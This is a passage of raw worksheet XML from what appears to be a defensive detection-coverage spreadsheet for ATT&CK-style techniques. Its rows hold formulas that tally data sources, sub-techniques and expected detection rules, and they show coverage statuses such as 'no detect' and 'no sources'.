      <c r="H414" s="9" cm="1">
        <f t="array" ref="H414">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>6</v>
      </c>
      <c r="I414" s="9" t="str" cm="1">
        <f t="array" ref="I414">IF(SUM(IF($C414=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C414=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J414" s="9" cm="1">
        <f t="array" ref="J41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414" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>6</v>
      </c>
      <c r="M414" s="9" cm="1">
        <f t="array" ref="M414">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>6</v>
      </c>
      <c r="N414" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O414" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P414" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S41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14" t="s">
        <v>485</v>
      </c>
      <c r="U414" t="s">
        <v>2035</v>
      </c>
      <c r="V414" t="s">
        <v>2036</v>
      </c>
      <c r="W414" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="415" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A415" t="s">
        <v>2033</v>
      </c>
      <c r="B415" t="s">
        <v>2037</v>
      </c>
      <c r="C415" t="s">
        <v>2038</v>
      </c>
      <c r="D415" t="s">
        <v>7</v>
      </c>
      <c r="E415" t="s">
        <v>2039</v>
      </c>
      <c r="F415" s="9">
        <f t="shared" si="6"/>
        <v>4</v>
      </c>
      <c r="G415" s="9" cm="1">
        <f t="array" ref="G415">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H415" s="9" t="str" cm="1">
        <f t="array" ref="H415">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I415" s="9" t="str" cm="1">
        <f t="array" ref="I415">IF(SUM(IF($C415=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C415=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J415" s="9" t="str" cm="1">
        <f t="array" ref="J41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15" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M415" s="9" cm="1">
        <f t="array" ref="M415">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N415" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O415" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P415" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S41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15" t="s">
        <v>658</v>
      </c>
      <c r="U415" t="s">
        <v>2040</v>
      </c>
      <c r="V415" t="s">
        <v>2041</v>
      </c>
      <c r="W415" t="b">
        <v>1</v>
      </c>
      <c r="X415" t="s">
        <v>2033</v>
      </c>
    </row>
    <row r="416" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A416" t="s">
        <v>2033</v>
      </c>
      <c r="B416" t="s">
        <v>2042</v>
      </c>
      <c r="C416" t="s">
        <v>2043</v>
      </c>
      <c r="D416" t="s">
        <v>7</v>
      </c>
      <c r="E416" t="s">
        <v>2044</v>
      </c>
      <c r="F416" s="9">
        <f t="shared" si="6"/>
        <v>2</v>
      </c>
      <c r="G416" s="9" cm="1">
        <f t="array" ref="G416">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H416" s="9" t="str" cm="1">
        <f t="array" ref="H416">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I416" s="9" t="str" cm="1">
        <f t="array" ref="I416">IF(SUM(IF($C416=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C416=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J416" s="9" t="str" cm="1">
        <f t="array" ref="J41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16" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M416" s="9" cm="1">
        <f t="array" ref="M416">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N416" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O416" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P416" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S41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16" t="s">
        <v>503</v>
      </c>
      <c r="U416" t="s">
        <v>2045</v>
      </c>
      <c r="V416" t="s">
        <v>2046</v>
      </c>
      <c r="W416" t="b">
        <v>1</v>
      </c>
      <c r="X416" t="s">
        <v>2033</v>
      </c>
    </row>
    <row r="417" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A417" t="s">
        <v>2033</v>
      </c>
      <c r="B417" t="s">
        <v>2047</v>
      </c>
      <c r="C417" t="s">
        <v>2048</v>
      </c>
      <c r="D417" t="s">
        <v>7</v>
      </c>
      <c r="E417" t="s">
        <v>2049</v>
      </c>
      <c r="F417" s="9">
        <f t="shared" si="6"/>
        <v>4</v>
      </c>
      <c r="G417" s="9" cm="1">
        <f t="array" ref="G417">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H417" s="9" t="str" cm="1">
        <f t="array" ref="H417">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I417" s="9" t="str" cm="1">
        <f t="array" ref="I417">IF(SUM(IF($C417=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C417=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J417" s="9" t="str" cm="1">
        <f t="array" ref="J41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17" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M417" s="9" cm="1">
        <f t="array" ref="M417">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N417" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O417" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P417" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S41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17" t="s">
        <v>368</v>
      </c>
      <c r="U417" t="s">
        <v>2050</v>
      </c>
      <c r="V417" t="s">
        <v>2051</v>
      </c>
      <c r="W417" t="b">
        <v>1</v>
      </c>
      <c r="X417" t="s">
        <v>2033</v>
      </c>
    </row>
    <row r="418" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A418" t="s">
        <v>2033</v>
      </c>
      <c r="B418" t="s">
        <v>2052</v>
      </c>
      <c r="C418" t="s">
        <v>2053</v>
      </c>
      <c r="D418" t="s">
        <v>7</v>
      </c>
      <c r="E418" t="s">
        <v>2039</v>
      </c>
      <c r="F418" s="9">
        <f t="shared" si="6"/>
        <v>4</v>
      </c>
      <c r="G418" s="9" cm="1">
        <f t="array" ref="G418">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H418" s="9" t="str" cm="1">
        <f t="array" ref="H418">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I418" s="9" t="str" cm="1">
        <f t="array" ref="I418">IF(SUM(IF($C418=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C418=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J418" s="9" t="str" cm="1">
        <f t="array" ref="J41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18" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M418" s="9" cm="1">
        <f t="array" ref="M418">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N418" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O418" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P418" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S41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18" t="s">
        <v>386</v>
      </c>
      <c r="U418" t="s">
        <v>2054</v>
      </c>
      <c r="V418" t="s">
        <v>2055</v>
      </c>
      <c r="W418" t="b">
        <v>1</v>
      </c>
      <c r="X418" t="s">
        <v>2033</v>
      </c>
    </row>
    <row r="419" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A419" t="s">
        <v>2033</v>
      </c>
      <c r="B419" t="s">
        <v>2056</v>
      </c>
      <c r="C419" t="s">
        <v>2057</v>
      </c>
      <c r="D419" t="s">
        <v>7</v>
      </c>
      <c r="E419" t="s">
        <v>2049</v>
      </c>
      <c r="F419" s="9">
        <f t="shared" si="6"/>
        <v>4</v>
      </c>
      <c r="G419" s="9" cm="1">
        <f t="array" ref="G419">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H419" s="9" t="str" cm="1">
        <f t="array" ref="H419">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I419" s="9" t="str" cm="1">
        <f t="array" ref="I419">IF(SUM(IF($C419=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C419=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J419" s="9" t="str" cm="1">
        <f t="array" ref="J41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19" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M419" s="9" cm="1">
        <f t="array" ref="M419">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N419" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O419" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P419" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S41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19" t="s">
        <v>368</v>
      </c>
      <c r="U419" t="s">
        <v>2058</v>
      </c>
      <c r="V419" t="s">
        <v>2059</v>
      </c>
      <c r="W419" t="b">
        <v>1</v>
      </c>
      <c r="X419" t="s">
        <v>2033</v>
      </c>
    </row>
    <row r="420" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A420" t="s">
        <v>2033</v>
      </c>
      <c r="B420" t="s">
        <v>2060</v>
      </c>
      <c r="C420" t="s">
        <v>242</v>
      </c>
      <c r="D420" t="s">
        <v>7</v>
      </c>
      <c r="E420" t="s">
        <v>2061</v>
      </c>
      <c r="F420" s="9">
        <f t="shared" si="6"/>
        <v>1</v>
      </c>
      <c r="G420" s="9" cm="1">
        <f t="array" ref="G420">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H420" s="9" t="str" cm="1">
        <f t="array" ref="H420">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I420" s="9" t="str" cm="1">
        <f t="array" ref="I420">IF(SUM(IF($C420=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C420=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J420" s="9" t="str" cm="1">
        <f t="array" ref="J42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20" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M420" s="9" cm="1">
        <f t="array" ref="M420">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N420" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O420" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P420" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S42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20" t="s">
        <v>520</v>
      </c>
      <c r="U420" t="s">
        <v>2062</v>
      </c>
      <c r="W420" t="b">
        <v>1</v>
      </c>
      <c r="X420" t="s">
        <v>2033</v>
      </c>
    </row>
    <row r="421" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A421" t="s">
        <v>2063</v>
      </c>
      <c r="B421" t="s">
        <v>2063</v>
      </c>
      <c r="C421" t="s">
        <v>108</v>
      </c>
      <c r="D421" t="s">
        <v>2064</v>
      </c>
      <c r="E421" t="s">
        <v>2065</v>
      </c>
      <c r="F421" s="9">
        <f t="shared" si="6"/>
        <v>13</v>
      </c>
      <c r="G421" s="9" cm="1">
        <f t="array" ref="G421">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H421" s="9" cm="1">
        <f t="array" ref="H421">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>9</v>
      </c>
      <c r="I421" s="9" t="str" cm="1">
        <f t="array" ref="I421">IF(SUM(IF($C421=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C421=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J421" s="9" cm="1">
        <f t="array" ref="J42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421" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>9</v>
      </c>
      <c r="M421" s="9" cm="1">
        <f t="array" ref="M421">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>9</v>
      </c>
      <c r="N421" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O421" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P421" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S42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21" t="s">
        <v>1322</v>
      </c>
      <c r="U421" t="s">
        <v>2066</v>
      </c>
      <c r="V421" t="s">
        <v>2067</v>
      </c>
      <c r="W421" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="422" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A422" t="s">
        <v>2063</v>
      </c>
      <c r="B422" t="s">
        <v>2068</v>
      </c>
      <c r="C422" t="s">
        <v>318</v>
      </c>
      <c r="D422" t="s">
        <v>2064</v>
      </c>
      <c r="E422" t="s">
        <v>2069</v>
      </c>
      <c r="F422" s="9">
        <f t="shared" si="6"/>
        <v>4</v>
      </c>
      <c r="G422" s="9" cm="1">
        <f t="array" ref="G422">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H422" s="9" t="str" cm="1">
        <f t="array" ref="H422">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I422" s="9" t="str" cm="1">
        <f t="array" ref="I422">IF(SUM(IF($C422=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C422=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J422" s="9" t="str" cm="1">
        <f t="array" ref="J42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22" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M422" s="9" cm="1">
        <f t="array" ref="M422">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N422" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O422" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P422" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S42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22" t="s">
        <v>386</v>
      </c>
      <c r="U422" t="s">
        <v>2070</v>
      </c>
      <c r="V422" t="s">
        <v>2071</v>
      </c>
      <c r="W422" t="b">
        <v>1</v>
      </c>
      <c r="X422" t="s">
        <v>2063</v>
      </c>
    </row>
    <row r="423" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A423" t="s">
        <v>2063</v>
      </c>
      <c r="B423" t="s">
        <v>2072</v>
      </c>
      <c r="C423" t="s">
        <v>2073</v>
      </c>
      <c r="D423" t="s">
        <v>2064</v>
      </c>
      <c r="E423" t="s">
        <v>2074</v>
      </c>
      <c r="F423" s="9">
        <f t="shared" si="6"/>
        <v>3</v>
      </c>
      <c r="G423" s="9" cm="1">
        <f t="array" ref="G423">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H423" s="9" t="str" cm="1">
        <f t="array" ref="H423">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I423" s="9" t="str" cm="1">
        <f t="array" ref="I423">IF(SUM(IF($C423=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C423=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J423" s="9" t="str" cm="1">
        <f t="array" ref="J42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23" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M423" s="9" cm="1">
        <f t="array" ref="M423">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N423" s="9">
